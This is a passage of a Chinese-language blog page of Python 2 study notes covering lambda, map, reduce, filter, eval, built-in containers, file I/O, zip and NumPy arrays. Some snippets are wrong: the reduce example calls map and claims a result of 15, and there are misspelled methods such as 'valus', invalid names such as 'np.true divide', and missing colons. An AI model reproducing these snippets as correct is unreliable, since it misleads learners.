k3 True</span></div></pre></td></tr></table></figure></p>
<h3 id="Lambda函数"><a href="#Lambda函数" class="headerlink" title="Lambda函数"></a>Lambda函数</h3><p>Lambda函数——快速定义单行函数<br><strong>lambda (输入参数)：表达式</strong><br>输入参数：可以有多个，’,’隔开<br>表达式：表达式的处理结果为返回值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">f=<span class="keyword">lambda</span> x,y:x+y</div><div class="line"><span class="keyword">print</span> f(<span class="number">4</span>,<span class="number">5</span>) <span class="comment">#9</span></div></pre></td></tr></table></figure></p>
<h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><p>map函数——序列映射函数<br><strong>Map(函数，序列)</strong><br>函数：一个函数<br>序列：可以多个<br>返回：处理后的对应序列<br>多个序列输入到一个函数返回一个序列<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line">n=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> map(<span class="keyword">lambda</span> x,y:x+y,m,n)</div><div class="line"><span class="comment">#[2, 4, 6, 8, 10]</span></div></pre></td></tr></table></figure></p>
<h3 id="Reduce函数"><a href="#Reduce函数" class="headerlink" title="Reduce函数"></a>Reduce函数</h3><p>Reduce函数——序列叠加函数<br><strong>Reduce(函数,序列)</strong><br>函数：一个函数<br>序列：一个序列<br>返回：值<br>从序列中从左到右依次取数，进入函数，返回值作为第一个参数继续进入，如此叠加<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> map(<span class="keyword">lambda</span> x,y:x+y,m)</div><div class="line"><span class="comment">#15</span></div></pre></td></tr></table></figure></p>
<h3 id="Filter函数"><a href="#Filter函数" class="headerlink" title="Filter函数"></a>Filter函数</h3><p>Filter函数——过滤函数<br><strong>filter(函数，序列)</strong><br>函数：一个函数<br>序列：一个序列<br>返回 函数返回结果为真的值 组成的序列<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</div><div class="line"><span class="keyword">print</span> filter(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,m)</div><div class="line"><span class="comment">#[1, 3, 5] 此处是奇数返回1</span></div></pre></td></tr></table></figure></p>
<h3 id="Eval-函数"><a href="#Eval-函数" class="headerlink" title="Eval()函数"></a>Eval()函数</h3><p><strong>eval(str)</strong><br>str：字符串<br>将字符串str当成有效的表达式来求值并返回计算结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m=<span class="string">"1+2"</span></div><div class="line"><span class="keyword">print</span> eval(m)</div><div class="line"><span class="comment">#3</span></div></pre></td></tr></table></figure></p>
<h2 id="列表（序列、List）"><a href="#列表（序列、List）" class="headerlink" title="列表（序列、List）"></a>列表（序列、List）</h2><p>动态数组，有序<br>数组的值可以是任意类型<br>字符串运算、索引、切片同样适用</p>
<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成列表,创建列表副本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a=[<span class="number">1</span>,<span class="string">'a'</span>,[<span class="string">'abc'</span>,<span class="number">1</span>],<span class="number">3</span>] <span class="comment"># 可嵌套</span></div><div class="line"><span class="comment">##列表解析 [表达式 for 变量 in 列表 if 条件]</span></div><div class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)] <span class="comment"># 0-9</span></div><div class="line">a=[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>)] <span class="comment"># 1,4,9,16,25</span></div><div class="line">a=[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>] <span class="comment"># [2,4]</span></div><div class="line"><span class="comment">##列表副本</span></div><div class="line">b=a    <span class="comment"># b和a指向同一地址，牵一发而动全身</span></div><div class="line">b=a[:] <span class="comment"># b为一个新的列表不是跟a指向同一地址，就是切片[0:len(a)]，切片是生成新的列表</span></div></pre></td></tr></table></figure></p>
<p>添加、删除、插入（不返回新列表，在原列表操作）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">list=[<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">list.append(<span class="number">3</span>) <span class="comment"># [1,2,3]</span></div><div class="line">list.append([<span class="number">3</span>,<span class="number">4</span>]) <span class="comment"># [1,2,[3,4]]</span></div><div class="line">list.remove(<span class="number">1</span>) <span class="comment"># [2,[3,4]]  删除对应的值，不是索引，多相同值，移除接近头的</span></div><div class="line">list.insert(<span class="number">1</span>,<span class="number">-1</span>) <span class="comment"># [2,-1,[3,4]] 在索引为1的位置插入-1</span></div></pre></td></tr></table></figure></p>
<p>取尾元素、反转、排序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">list=[<span class="number">2</span>,<span class="number">-1</span>,<span class="number">3</span>]</div><div class="line">list.pop() <span class="comment"># [2,-1] 返回尾元素 list删除尾元素</span></div><div class="line">list.reverse() <span class="comment"># [-1,2]  在原列表操作</span></div><div class="line">re = list[::<span class="number">-1</span>] <span class="comment"># [-1,2]</span></div><div class="line">a=[<span class="number">-3</span>,<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">a.sort() <span class="comment"># [-3，1,2] 默认从小到大</span></div><div class="line">sorted(a) <span class="comment"># [-3，1,2]</span></div><div class="line">a.sort(key=abs) <span class="comment"># [1,2,-3]</span></div><div class="line">a.sort(key=<span class="keyword">lambda</span> x : <span class="number">1</span>/x) <span class="comment"># [-3,2,1]</span></div></pre></td></tr></table></figure></p>
<h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate()函数"></a>enumerate()函数</h3><p>为可遍历对象提供索引<br>返回[(索引0，值0),(索引1，值1)……]<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">m=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</div><div class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> enumerate(m):</div><div class="line">    <span class="keyword">print</span> index,value</div><div class="line"><span class="comment"># 0 1</span></div><div class="line"><span class="comment"># 1 2</span></div><div class="line"><span class="comment"># 2 3</span></div><div class="line"><span class="comment"># 3 4</span></div></pre></td></tr></table></figure></p>
<h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">x=[[<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">7</span>],[<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</div><div class="line"><span class="keyword">print</span> x[<span class="number">2</span>][<span class="number">1</span>]  <span class="comment"># 1 第三行第二个</span></div><div class="line"><span class="keyword">print</span> len(x)   <span class="comment"># 3 行数</span></div><div class="line"><span class="keyword">print</span> len(x[<span class="number">0</span>]) <span class="comment"># 4 列数</span></div></pre></td></tr></table></figure>
<h3 id="列表实例"><a href="#列表实例" class="headerlink" title="列表实例"></a>列表实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#一行输入多个数，保存在列表中</span></div><div class="line"><span class="comment">#raw_input() 默认是字符串 .split() 返回的是列表，列表的数据是字符</span></div><div class="line">a=[int(i) <span class="keyword">for</span> i <span class="keyword">in</span> raw_input(<span class="string">"输入多个数,空格分割"</span>).split()]</div><div class="line"><span class="keyword">print</span> a  <span class="comment">#[1, 2, 3, 4]</span></div></pre></td></tr></table></figure>
<h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h2><p>静态数组，不能修改，长度固定<br>索引，切片，len适用<br>元组与列表可以嵌套</p>
<h3 id="基础操作-1"><a href="#基础操作-1" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成元组,赋值，交换<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#生成</span></div><div class="line">a=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>   <span class="comment">#(1, 2, 3, 4)</span></div><div class="line">b=(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">7.0</span>,<span class="number">8</span>) <span class="comment">#(5, 'a', 7.0, 8)</span></div><div class="line"><span class="comment">#赋值</span></div><div class="line">b=a <span class="comment"># (1, 2, 3, 4)  因为不能修改 无所谓地址不地址吧？</span></div><div class="line"><span class="comment">#交换</span></div><div class="line">a,c = c,a  <span class="comment">#相当于（a,c）=(c,a) 所以a,c 可以是任意类型</span></div><div class="line">a,c=<span class="string">'1 3'</span>.split() <span class="comment">#，的其他用法，但是此时得到a,c就不是元组</span></div><div class="line"><span class="keyword">print</span> a <span class="comment"># 1</span></div><div class="line"><span class="keyword">print</span> c <span class="comment"># 3</span></div></pre></td></tr></table></figure></p>
<h3 id="元组实例"><a href="#元组实例" class="headerlink" title="元组实例"></a>元组实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x,y)</span></span></div><div class="line">    return x,y,x+y</div><div class="line">x,y,z=add(<span class="number">6</span>,<span class="number">7</span>)</div><div class="line"><span class="keyword">print</span> x,y,z <span class="comment"># 6 7 13</span></div></pre></td></tr></table></figure>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>键值对<br>不支持切片，索引</p>
<h3 id="基础操作-2"><a href="#基础操作-2" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成,访问,添加，删除<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#键不可重复不可变，数字，字符串，元组，不能是列表（可变）</span></div><div class="line"> <span class="comment">#值是任意类型</span></div><div class="line"><span class="comment">#生成</span></div><div class="line">dic=&#123;<span class="string">'name'</span>:<span class="string">'lala'</span>,<span class="string">'id'</span>:<span class="number">1</span>&#125; <span class="comment">#键名是字符串需要''</span></div><div class="line">a=dict(name=<span class="string">'liming'</span>,age=<span class="number">20</span>) <span class="comment">#键名是字符串不需要''</span></div><div class="line"><span class="comment">#访问</span></div><div class="line"><span class="keyword">print</span> dic[<span class="string">'name'</span>] <span class="comment"># lala</span></div><div class="line"><span class="comment">#添加更新</span></div><div class="line">dic[<span class="string">'num'</span>]=<span class="number">1</span></div><div class="line">dic.update(&#123;<span class="string">'ok'</span>:<span class="string">'1'</span>&#125;) <span class="comment">#从b字典中更新a字典，如果键相同则更新，a中不存在则追加</span></div><div class="line"><span class="comment">#删除</span></div><div class="line"><span class="keyword">del</span> dic[<span class="string">'ok'</span>]</div><div class="line">dic.pop(<span class="string">'num'</span>)</div></pre></td></tr></table></figure></p>
<h3 id="字典应用"><a href="#字典应用" class="headerlink" title="字典应用"></a>字典应用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">len(dic) <span class="comment">#字典中键值对的数量</span></div><div class="line"><span class="keyword">if</span> key <span class="keyword">in</span> dic :<span class="comment">#判断</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'ok'</span></div><div class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic : <span class="comment">#枚举字典中的键，键是无序的</span></div><div class="line">    <span class="keyword">print</span> dic[key]</div><div class="line">dic.items() <span class="comment"># 全部的键值对 用两个变量接受</span></div><div class="line">dic.keys() <span class="comment"># 全部的键</span></div><div class="line">dic.valus() <span class="comment"># 全部的值</span></div><div class="line">dic.clear() <span class="comment"># 清空字典</span></div></pre></td></tr></table></figure>
<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> h.iteritems()</div><div class="line">    <span class="keyword">print</span> t  <span class="comment"># (1, 'lala')</span></div><div class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> h.items()</div><div class="line">    <span class="keyword">print</span> t,v <span class="comment"># 1 lala</span></div></pre></td></tr></table></figure>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>元素不重复，无序，不能枚举<br>不支持索引和切片操作<br>分为可变集合（set）和不变集合(frozen set)</p>
<h3 id="基础操作-3"><a href="#基础操作-3" class="headerlink" title="基础操作"></a>基础操作</h3><p>生成、添加、删除<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#生成</span></div><div class="line">x=&#123;<span class="string">'key1'</span>,<span class="string">'key2'</span>&#125; </div><div class="line"><span class="keyword">print</span> x <span class="comment"># set(['key2', 'key1'])</span></div><div class="line">y=frozenset([<span class="string">'key1'</span>,<span class="string">'key2'</span>])</div><div class="line"><span class="keyword">print</span> y <span class="comment"># frozenset(['key2', 'key1'])</span></div><div class="line">k=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line">l=set(k)</div><div class="line"><span class="keyword">print</span> l <span class="comment"># set([1, 2, 3])</span></div><div class="line"><span class="comment">#添加</span></div><div class="line">l.add(<span class="string">'body'</span>) <span class="comment"># set(['body', 1, 2, 3])</span></div><div class="line"><span class="comment">#删除</span></div><div class="line">l.remove(<span class="string">'body'</span>) <span class="comment"># set([1, 2, 3])</span></div><div class="line">l.discard(<span class="string">'body'</span>) <span class="comment"># set([1, 2, 3]) 删除不存在的元素。discard不抛出异常，remove抛出异常</span></div></pre></td></tr></table></figure></p>
<h3 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># - 差集</span></div><div class="line"><span class="comment"># &amp; 交集</span></div><div class="line"><span class="comment"># | 并集</span></div><div class="line"><span class="comment"># != 不等于</span></div><div class="line"><span class="comment"># == 等于</span></div><div class="line"><span class="comment"># &lt; 是否为子集</span></div><div class="line"><span class="comment"># &gt; 是否为超集</span></div><div class="line"><span class="comment"># set.isdisjoint(t) 是否有交集</span></div></pre></td></tr></table></figure>
<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">f=open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)</div><div class="line">f.read() <span class="comment"># 一次读取文件的全部的内容 存入str</span></div><div class="line">f.readline() <span class="comment"># 每次读取一行</span></div><div class="line">f.readlines()  <span class="comment"># 一次读取所有内容并按行返回list列表</span></div><div class="line"></div><div class="line">f=open(<span class="string">'test.txt'</span>,<span class="string">'w'</span>) <span class="comment"># </span></div><div class="line">f.write(<span class="string">'Hello'</span>) <span class="comment"># </span></div><div class="line">f.close()</div></pre></td></tr></table></figure>
<h2 id="Zip函数"><a href="#Zip函数" class="headerlink" title="Zip函数"></a>Zip函数</h2><p>zip(list1,list2)<br>输入：任意多个（包括0个和1个）序列  元组也可<br>返回：各个序列相应索引组成的元组的列表<br>序列长度不一，最后有多少个元组，取最短的序列作为元组长度<br>0个序列时 返回空序列<br>1个序列时 返回一个值的元组组成的序列 如：[(1,),(2,)]<br>zip(*list)<br>把zip的结果作为list输入，相当于unzip()<br>把序列拆分，其中的元组作为序列重新zip，变为原来的序列对应的元组</p>
<h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><p>列表list元素可以是任何对象，保存指针，浪费内存cpu<br>python自带array——一维数组，没有运算函数<br>Numpy的两种基本对象：<br>ndarray：数组，存储单一数据类型的多维数组<br>ufuc：对数组进行处理的函数</p>
<h3 id="ndarray对象"><a href="#ndarray对象" class="headerlink" title="ndarray对象"></a>ndarray对象</h3><p>索引，切片适用<br>导入、生成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="comment">#from numpy import *</span></div><div class="line"><span class="comment">##### 通过创建python序列，再通过array函数转化为数组</span></div><div class="line">a=np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],dtype=np.float) <span class="comment">#dtype 设定元素类型，默认整数</span></div><div class="line"><span class="keyword">print</span> a  <span class="comment"># [ 1.  2.  3.  4.]</span></div><div class="line"><span class="keyword">print</span> a.dtype <span class="comment"># float64</span></div><div class="line">b=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]])</div><div class="line"><span class="keyword">print</span> b  </div><div class="line"><span class="comment">#[[1 2 3 4]</span></div><div class="line"><span class="comment"># [5 6 7 8]]</span></div><div class="line"><span class="comment">##### numpy自带创建创建数组函数</span></div><div class="line"><span class="comment">#np.arange(start=0,end,step=1) 左包右开</span></div><div class="line">g=np.arange(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0.2</span>) <span class="comment"># [ 0.   0.2  0.4  0.6  0.8]</span></div><div class="line"><span class="comment">#np.linspace(start,end,num,endpoint=True(包括终值)) 等差数列</span></div><div class="line">h=np.linspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">5</span>,endpoint=<span class="keyword">False</span>) <span class="comment"># [ 0.   0.2  0.4  0.6  0.8]</span></div><div class="line"><span class="comment">#np.logspace(start,end,num,endpoint=True(包括终值)),base=10（底数）) 等比数列</span></div><div class="line"><span class="comment">#base^start~base^end 取num</span></div><div class="line">j=np.logspace(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,base=<span class="number">2</span>) <span class="comment"># [ 1.  2.]</span></div><div class="line"><span class="comment">#全0</span></div><div class="line">np.zeros((<span class="number">3</span>,<span class="number">3</span>))</div><div class="line"><span class="comment">#全1</span></div><div class="line">np.ones((<span class="number">3</span>,<span class="number">3</span>))</div><div class="line"><span class="comment">#对角线为1，4*4</span></div><div class="line">np.eye(<span class="number">4</span>)</div><div class="line"><span class="comment">#随机数 元素值0-1的2*2的随机数组</span></div><div class="line">np.random.rand(<span class="number">2</span>,<span class="number">2</span>)</div><div class="line"><span class="comment">#fromfuction（函数，尺寸） 生成乘法表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i,j)</span>:</span></div><div class="line">    <span class="keyword">return</span> (i+<span class="number">1</span>)*(j+<span class="number">1</span>)</div><div class="line">table = np.fromfunction(func,(<span class="number">4</span>,<span class="number">4</span>))</div><div class="line"><span class="comment"># [[  1.   2.   3.   4.]</span></div><div class="line"><span class="comment">#  [  2.   4.   6.   8.]</span></div><div class="line"><span class="comment">#  [  3.   6.   9.  12.]</span></div><div class="line"><span class="comment">#  [  4.   8.  12.  16.]]</span></div></pre></td></tr></table></figure></p>
<h3 id="ndarray函数"><a href="#ndarray函数" class="headerlink" title="ndarray函数"></a>ndarray函数</h3><p>以下类似1,2 其实都是元组 （1,2）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#获取数组维数</span></div><div class="line"><span class="keyword">print</span> a.shape,b.shape <span class="comment"># (4L,) (2L, 4L) 一维数组 4列 二维数组 2行4列</span></div><div class="line"><span class="comment">#元素不变情况下,定义数组尺寸</span></div><div class="line">b.shape=<span class="number">4</span>,<span class="number">2</span></div><div class="line"><span class="keyword">print</span> b</div><div class="line"><span class="comment"># [[1 2]</span></div><div class="line"><span class="comment">#  [3 4]</span></div><div class="line"><span class="comment">#  [5 6]</span></div><div class="line"><span class="comment">#  [7 8]]</span></div><div class="line"><span class="comment">#创建改变数组尺寸的新数组</span></div><div class="line">c=b.reshape(<span class="number">8</span>,)  <span class="comment"># [1 2 3 4 5 6 7 8]</span></div><div class="line">d=b.reshape(<span class="number">1</span>,<span class="number">8</span>) <span class="comment"># [[1 2 3 4 5 6 7 8]]</span></div><div class="line"><span class="comment">## reshape生成的新数组其实共享数据存储区域，牵一发而动全身</span></div></pre></td></tr></table></figure></p>
<h4 id="存取数组"><a href="#存取数组" class="headerlink" title="存取数组"></a>存取数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#### 二维数组的切片取数  二维列表没有二维切片</span></div><div class="line">data=np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>)</div><div class="line">data2=data[<span class="number">1</span>:<span class="number">3</span>,<span class="number">2</span>:<span class="number">4</span>] <span class="comment">#左闭右开</span></div><div class="line">[[ <span class="number">6</span>  <span class="number">7</span>]</div><div class="line"> [<span class="number">10</span> <span class="number">11</span>]]</div><div class="line"><span class="comment">#########data展开成一行</span></div><div class="line"><span class="keyword">print</span> data[:]</div><div class="line"><span class="comment">#### 通过列表list取数 </span></div><div class="line"><span class="comment">##整数序列 作为索引 取行</span></div><div class="line">data3=data[[<span class="number">0</span>,<span class="number">1</span>]]</div><div class="line">[[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</div><div class="line"> [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]]</div><div class="line"><span class="comment">##元组序列 作为点索引 取点</span></div><div class="line">data4=data[[(<span class="number">0</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">1</span>)]]</div><div class="line">[<span class="number">0</span> <span class="number">1</span>]</div><div class="line"><span class="comment">##布尔序列 元素个数要一致</span></div><div class="line">data5=data4[np.array([<span class="keyword">True</span>,<span class="keyword">False</span>])]</div><div class="line">data5=data4[[<span class="keyword">True</span>,<span class="keyword">False</span>]]  <span class="comment">#两者一样</span></div><div class="line">[<span class="number">0</span>]</div><div class="line"><span class="comment">#### 条件筛选</span></div><div class="line">data2&gt;<span class="number">10</span> </div><div class="line">[[<span class="keyword">False</span> <span class="keyword">False</span>]</div><div class="line"> [<span class="keyword">False</span>  <span class="keyword">True</span>]]</div><div class="line"><span class="comment">#选出data中大于10的元素变成一维数组 原理是布尔序列取数</span></div><div class="line">data[data&gt;<span class="number">10</span>] <span class="comment">#[11 12 13 14 15]</span></div><div class="line"><span class="comment">#选出data中偶数元素变为一维数组  原理是布尔序列取数</span></div><div class="line">data[data%<span class="number">2</span>==<span class="number">0</span>] <span class="comment">#[ 0  2  4  6  8 10 12 14]</span></div></pre></td></tr></table></figure>
<h4 id="where函数"><a href="#where函数" class="headerlink" title="where函数"></a>where函数</h4><p>元素依次进入，生成返回值数组<br>np.where(条件,真返回值,假返回值)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf8</span></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line">arr=np.random.rand(<span class="number">2</span>,<span class="number">2</span>)</div><div class="line"><span class="keyword">print</span> np.where(arr&gt;<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0</span>)</div><div class="line">[[<span class="number">1</span> <span class="number">0</span>]</div><div class="line"> [<span class="number">0</span> <span class="number">0</span>]]</div></pre></td></tr></table></figure></p>
<p>cunsum函数、cumprod函数<br>对行（0）或列（1）累计求和、求列</p>
<h3 id="ufunc运算"><a href="#ufunc运算" class="headerlink" title="ufunc运算"></a>ufunc运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">np.sin(ndarray) <span class="comment">#对于ndarray中的每个元素求正弦值 返回新数组</span></div><div class="line">np.add(ndarray1,ndarray2[,ndarray3]) <span class="comment">#对于其中的元素一一相加 返回新数组[写入ndarray3]</span></div><div class="line">np.subtract(x1,x2[,y]) <span class="comment"># y=x1 - x2</span></div><div class="line">np.multiply(x1,x2[,y]) <span class="comment"># y=x1 * x2</span></div><div class="line">np.divide(x1,x2[,y]) <span class="comment"># y=x1 / x2</span></div><div class="line">np.true divide(x1,x2[,y]) <span class="comment"># y=x1 / x2 返回精确商</span></div><div class="line">np.floor divide(x1,x2[,y]) <span class="comment"># y=x1 // x2 返回对返回值取整</span></div><div class="line">np.negative(x[,y]) <span class="comment"># y= -x</span></div><div class="line">np.power(x1,x2[,y]) <span class="comment"># y = x1**x2</span></div><div class="line">np.remainder(x1,x2[,y]) <span class="comment"># y = x1 % x2</span></div></pre></td></tr></table></figure>
<h2 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h2><p>Series 和 DataFrame 支持切片、筛选</p>
